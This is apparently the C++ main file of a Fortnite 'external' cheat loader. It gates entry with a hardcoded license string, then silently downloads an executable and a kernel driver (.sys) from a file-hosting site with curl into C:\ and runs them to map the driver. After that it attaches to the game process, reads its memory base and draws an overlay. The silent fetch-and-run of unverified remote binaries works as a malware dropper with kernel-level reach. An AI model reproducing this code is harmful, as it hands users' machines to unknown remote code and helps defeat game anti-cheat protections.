
#include "includes.hpp"
#include <iostream>
#include <thread>

#include <iostream>
#include <string>


void main()
{
	std::cout << (R"(
                       
 __  __      _                    ___              
\ \/ /_ __ | | ___   ___ ___    / __\ __ ___  ___ 
 \  /| '_ \| |/ _ \ / __/ __|  / _\| '__/ _ \/ _ \
 /  \| |_) | | (_) | (_| (__  / /  | | |  __/  __/
/_/\_\ .__/|_|\___/ \___\___| \/   |_|  \___|\___|
     |_|                                          
                                                                                                       
                                                           
)");
	const std::string wedontlove_you = ".gg/xplo";
	std::string ugh;

	std::cout << "License Hash: ";
	std::getline(std::cin, ugh);

	if (ugh == wedontlove_you) {
		system("cls");
		SetConsoleTitle(L"Moldy cheese ");
		std::cout << ("Welcome to worlds most pasted external, please open your game!") << std::endl;
		Sleep(2500);
		std::cout << ("Loading Pasted Driver!") << std::endl;
		std::cout << ("Credits: Morva999") << std::endl;
		system("start https://discord.gg/xplo");
		system("curl --silent https://files.catbox.moe/ocqdwl.bin --output C:\\map_porn.exe >nul");
		system("curl --silent https://files.catbox.moe/dg3jiq.sys --output C:\\drv_porn.sys >nul");
	 system("C:\\map_porn.exe C:\\drv_porn.sys");
	
		if (Driver::Init()) {
			std::cout << ("We found the driver running in the memory!") << std::endl;
		} 
		else {
			std::cout << ("Your pc smells of garbage, and loooks like a gangster granny's grandma's child addiction!") << std::endl;
		}
		while (game_wnd == 0)
		{
			Sleep(1);
			//mem::process_id = mem::find_process(L"FortniteClient-Win64-Shipping.exe"); //searching for process // old driver
			//game_wnd = get_process_wnd(mem::process_id); //found the process //old driver
			processID = Driver::FindProcess(L"FortniteClient-Win64-Shipping.exe"); //searching for process
			game_wnd = get_process_wnd(processID); //found the process
			Sleep(1);
		}





		system("cls");
		std::cout << ("We love pastes!") << std::endl;
		std::cout << ("Credits: Morva999") << std::endl;
		if (!input::init())
		{
			printf("The input was not initialized :("); //input wasnt initialized please go to definition and check or check ur shitty pc !
			Sleep(3000);
			exit(0);
		}

		if (!gui::init())
		{
			printf("The gui was not initialized :("); //init/gui wasnt initialized please go to definition and check or check ur shitty pc !
			Sleep(3000);
			exit(0);
		}
		if (!Driver::Init())
		{
			printf("The driver was not initialized :("); //driver wasnt initialized please go to definition and check or check ur shitty pc OR YOU JUST FCKED THE COMMS IDK JUST DOUBLE CHECK EVERYTHING FOR THIS ONE!
			Sleep(3000);
			exit(0);
		}
		Driver::CR3();
		
		//if (!mem::fetch_cr3())
		//{

		//}
		// virtualaddy = mem::find_image(); // old driver
		Base = Driver::GetBase();

		if (!Base) //base_address //driver_handle
		{
			printf("The driver couldn't get the base address");
			Sleep(3000);
			exit(0);
		}
		
		create_overlay();
		directx_init();
		render_loop();
	}
	else {
		std::cout << "Invalid license key. Closing the application.\n";
		exit(1);
	}


}


